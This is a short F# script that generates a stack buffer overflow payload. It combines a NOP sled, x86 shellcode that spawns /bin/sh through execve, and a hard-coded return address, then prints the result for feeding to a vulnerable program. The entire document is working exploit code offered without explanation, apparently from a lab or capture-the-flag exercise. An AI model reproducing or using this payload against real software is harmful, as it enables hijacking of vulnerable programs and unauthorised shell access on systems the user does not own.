
let bufferOverflowScript totalLength (shellCode: string) retOverride = 
    let nops = totalLength - ((shellCode.Length / 4) + 4) // 4 is for ret address
    retOverride::shellCode::List.replicate nops @"\x90" |> List.rev |> String.concat ""

let shellcode = @"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
let address = @"\xc0\xd5\xff\xff"
let totalLength = 132

printfn "%s" <| bufferOverflowScript totalLength shellcode address